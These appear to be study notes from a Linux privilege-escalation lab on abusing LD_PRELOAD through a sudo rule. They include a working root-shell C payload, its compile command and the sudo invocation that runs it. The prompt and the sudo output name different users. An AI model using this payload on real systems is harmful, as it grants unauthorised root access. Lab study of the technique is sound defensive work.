#Linux_PrivilegeEscalation 

---

### LD_PRELOAD Privilege Escalation

To utilize `LD_PRELOAD` environment variable we need a user with sudo privileges. To check which binaries we can run with sudo privileges we use the following command:

```bash
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

- Above we can see that we can run `/usr/sbin/apache2 restart` with sudo privileges. We can exploit this by creating the following `root.c` file:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
- We compile the above file with the following:
```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
- We can then run the following command:
```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

